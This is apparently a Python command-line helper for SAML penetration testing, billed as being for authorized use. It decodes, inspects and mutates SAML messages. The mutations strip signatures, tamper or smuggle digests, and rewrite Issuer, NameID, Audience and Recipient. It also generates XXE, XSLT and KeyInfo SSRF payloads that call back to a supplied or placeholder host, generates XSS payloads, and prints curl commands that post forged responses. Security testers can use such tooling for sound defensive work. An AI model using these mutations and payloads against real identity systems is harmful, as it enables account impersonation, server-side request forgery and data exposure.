#!/usr/bin/env python3
import argparse
import base64
import hashlib
import html
import sys
import urllib.parse
import zlib
from pathlib import Path
from xml.dom import minidom
from xml.etree import ElementTree as ET

DSIG = "http://www.w3.org/2000/09/xmldsig#"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"
SAML = "urn:oasis:names:tc:SAML:2.0:assertion"

ET.register_namespace("ds", DSIG)
ET.register_namespace("samlp", SAMLP)
ET.register_namespace("saml", SAML)


def read_text(path):
    if path == "-":
        return sys.stdin.read()
    return Path(path).read_text()


def write_text(path, data):
    if path == "-":
        sys.stdout.write(data)
        return
    Path(path).write_text(data)


def normalize_param(value):
    return urllib.parse.unquote_plus(value.strip())


def decode_value(value, kind):
    raw = base64.b64decode(normalize_param(value))
    if kind == "request":
        try:
            return zlib.decompress(raw, -15)
        except zlib.error:
            return zlib.decompress(raw)
    return raw


def encode_value(xml_bytes, kind):
    if kind == "request":
        compressor = zlib.compressobj(wbits=-15)
        payload = compressor.compress(xml_bytes) + compressor.flush()
    else:
        payload = xml_bytes
    return base64.b64encode(payload).decode()


def pretty_xml(xml_bytes):
    try:
        return minidom.parseString(xml_bytes).toprettyxml(indent="  ")
    except Exception:
        return xml_bytes.decode(errors="replace")


def parse_xml(path):
    return ET.parse(path)


def qname(ns, local):
    return f"{{{ns}}}{local}"


def all_by_local(root, local):
    return [el for el in root.iter() if el.tag.split("}", 1)[-1] == local]


def first_text(root, local):
    node = next(iter(all_by_local(root, local)), None)
    return "".join(node.itertext()).strip() if node is not None else ""


def inspect_xml(path):
    tree = parse_xml(path)
    root = tree.getroot()
    fields = [
        ("root", root.tag),
        ("Response ID", root.attrib.get("ID", "")),
        ("Response Destination", root.attrib.get("Destination", "")),
        ("Response InResponseTo", root.attrib.get("InResponseTo", "")),
        ("IssueInstant", root.attrib.get("IssueInstant", "")),
        ("Issuer", first_text(root, "Issuer")),
        ("NameID", first_text(root, "NameID")),
        ("Audience", first_text(root, "Audience")),
    ]
    subject_data = next(iter(all_by_local(root, "SubjectConfirmationData")), None)
    if subject_data is not None:
        fields.extend([
            ("Recipient", subject_data.attrib.get("Recipient", "")),
            ("SubjectConfirmation InResponseTo", subject_data.attrib.get("InResponseTo", "")),
            ("NotOnOrAfter", subject_data.attrib.get("NotOnOrAfter", "")),
        ])
    authn = next(iter(all_by_local(root, "AuthnRequest")), None)
    if authn is not None:
        fields.extend([
            ("ACS URL", authn.attrib.get("AssertionConsumerServiceURL", "")),
            ("ProtocolBinding", authn.attrib.get("ProtocolBinding", "")),
            ("Authn Destination", authn.attrib.get("Destination", "")),
        ])
    fields.extend([
        ("Assertion count", str(len(all_by_local(root, "Assertion")))),
        ("Signature count", str(len(all_by_local(root, "Signature")))),
        ("DigestValue count", str(len(all_by_local(root, "DigestValue")))),
        ("Reference URI count", str(len(all_by_local(root, "Reference")))),
    ])
    for key, value in fields:
        if value:
            print(f"{key}: {value}")
    for attr in all_by_local(root, "Attribute"):
        name = attr.attrib.get("Name") or attr.attrib.get("FriendlyName") or "(unnamed)"
        values = ["".join(v.itertext()).strip() for v in list(attr)]
        print(f"Attribute {name}: {', '.join(v for v in values if v)}")


def remove_with_parent(root, predicate):
    removed = 0
    for parent in root.iter():
        for child in list(parent):
            if predicate(child):
                parent.remove(child)
                removed += 1
    return removed


def ensure_extensions(root):
    for child in list(root):
        if child.tag == qname(SAMLP, "Extensions") or child.tag.endswith("}Extensions"):
            return child
    ext = ET.Element(qname(SAMLP, "Extensions"))
    root.insert(1 if len(root) else 0, ext)
    return ext


def mutate(args):
    tree = parse_xml(args.xml)
    root = tree.getroot()
    if args.type == "remove-signature":
        count = remove_with_parent(root, lambda el: el.tag.endswith("}Signature") or el.tag == "Signature")
        if count == 0:
            print("warning: no Signature element removed", file=sys.stderr)
    elif args.type == "tamper-digest":
        digest = next(iter(all_by_local(root, "DigestValue")), None)
        if digest is None:
            raise SystemExit("no DigestValue element found")
        digest.text = "A" * max(8, len((digest.text or "").strip()))
    elif args.type == "smuggle-digest":
        if not args.digest_value:
            raise SystemExit("--digest-value is required for smuggle-digest")
        ext = ensure_extensions(root)
        node = ET.SubElement(ext, qname(DSIG, "DigestValue"))
        node.text = args.digest_value
    elif args.type == "set-issuer":
        for issuer in all_by_local(root, "Issuer"):
            issuer.text = args.value
    elif args.type == "set-nameid":
        for nameid in all_by_local(root, "NameID"):
            nameid.text = args.value
    elif args.type == "set-destination":
        root.attrib["Destination"] = args.value
    elif args.type == "set-recipient":
        for scd in all_by_local(root, "SubjectConfirmationData"):
            scd.attrib["Recipient"] = args.value
    elif args.type == "set-audience":
        for audience in all_by_local(root, "Audience"):
            audience.text = args.value
    else:
        raise SystemExit(f"unsupported mutation: {args.type}")
    data = ET.tostring(root, encoding="utf-8", xml_declaration=True)
    write_text(args.out, pretty_xml(data))


def payload(args):
    callback = args.callback_url or "https://example.invalid/saml-test"
    if args.type == "xxe":
        xml = f'''<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "{html.escape(callback)}">
]>
<samlp:Response xmlns:samlp="{SAMLP}" xmlns:saml="{SAML}" ID="_xxe" Version="2.0">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>
'''
    elif args.type == "xslt":
        xml = f'''<?xml version="1.0"?>
<samlp:Response xmlns:samlp="{SAMLP}" xmlns:saml="{SAML}" xmlns:ds="{DSIG}" ID="_xslt" Version="2.0">
  <saml:Issuer>xslt-test</saml:Issuer>
  <saml:Assertion ID="_a" Version="2.0">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_a">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
              <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
                <xsl:template match="/">
                  <xsl:value-of select="document('{html.escape(callback)}')"/>
                </xsl:template>
              </xsl:stylesheet>
            </ds:Transform>
          </ds:Transforms>
        </ds:Reference>
      </ds:SignedInfo>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
'''
    elif args.type == "keyinfo-ssrf":
        xml = f'''<?xml version="1.0"?>
<samlp:Response xmlns:samlp="{SAMLP}" xmlns:saml="{SAML}" xmlns:ds="{DSIG}" ID="_keyinfo" Version="2.0">
  <saml:Issuer>keyinfo-test</saml:Issuer>
  <saml:Assertion ID="_a" Version="2.0">
    <ds:Signature>
      <ds:KeyInfo>
        <ds:RetrievalMethod URI="{html.escape(callback)}"/>
      </ds:KeyInfo>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>
'''
    elif args.type == "xss":
        xss = html.escape(args.xss_payload or "<img src=x onerror=alert(1)>")
        xml = f'''<?xml version="1.0"?>
<samlp:Response xmlns:samlp="{SAMLP}" xmlns:saml="{SAML}" ID="_xss" Version="2.0" Destination="http://sp.example/acs?x={xss}">
  <saml:Issuer>{xss}</saml:Issuer>
</samlp:Response>
'''
    else:
        raise SystemExit(f"unsupported payload: {args.type}")
    write_text(args.out, xml)


def digest(args):
    data = Path(args.file).read_bytes()
    algo = hashlib.new(args.algorithm)
    algo.update(data)
    print(base64.b64encode(algo.digest()).decode())


def curl_form(args):
    saml_file = Path(args.samlresponse_file)
    cmd = [
        "curl",
        "-i",
        "-s",
        "-k",
        "-X", "POST",
        "--data-urlencode", f"SAMLResponse@{saml_file}",
    ]
    if args.relay_state_file:
        cmd.extend(["--data-urlencode", f"RelayState@{Path(args.relay_state_file)}"])
    cmd.append(args.url)
    quoted = " ".join("'" + c.replace("'", "'\"'\"'") + "'" for c in cmd)
    print("# Review target, scope, and payload before running.")
    print(quoted)


def main():
    parser = argparse.ArgumentParser(description="CLI helper for authorized SAML testing")
    sub = parser.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("decode")
    p.add_argument("--kind", choices=["request", "response"], required=True)
    p.add_argument("--input-file", required=True)
    p.add_argument("--out", default="-")

    p = sub.add_parser("encode")
    p.add_argument("--kind", choices=["request", "response"], required=True)
    p.add_argument("--xml", required=True)
    p.add_argument("--out", default="-")

    p = sub.add_parser("inspect")
    p.add_argument("--xml", required=True)

    p = sub.add_parser("mutate")
    p.add_argument("--type", choices=[
        "remove-signature", "tamper-digest", "smuggle-digest", "set-issuer",
        "set-nameid", "set-destination", "set-recipient", "set-audience",
    ], required=True)
    p.add_argument("--xml", required=True)
    p.add_argument("--out", required=True)
    p.add_argument("--value")
    p.add_argument("--digest-value")

    p = sub.add_parser("payload")
    p.add_argument("--type", choices=["xxe", "xslt", "keyinfo-ssrf", "xss"], required=True)
    p.add_argument("--callback-url")
    p.add_argument("--xss-payload")
    p.add_argument("--out", required=True)

    p = sub.add_parser("digest")
    p.add_argument("--file", required=True)
    p.add_argument("--algorithm", default="sha256")

    p = sub.add_parser("curl-form")
    p.add_argument("--url", required=True)
    p.add_argument("--samlresponse-file", required=True)
    p.add_argument("--relay-state-file")

    args = parser.parse_args()
    if args.cmd == "decode":
        xml = decode_value(read_text(args.input_file), args.kind)
        write_text(args.out, pretty_xml(xml))
    elif args.cmd == "encode":
        out = encode_value(Path(args.xml).read_bytes(), args.kind)
        write_text(args.out, out)
    elif args.cmd == "inspect":
        inspect_xml(args.xml)
    elif args.cmd == "mutate":
        mutate(args)
    elif args.cmd == "payload":
        payload(args)
    elif args.cmd == "digest":
        digest(args)
    elif args.cmd == "curl-form":
        curl_form(args)


if __name__ == "__main__":
    main()
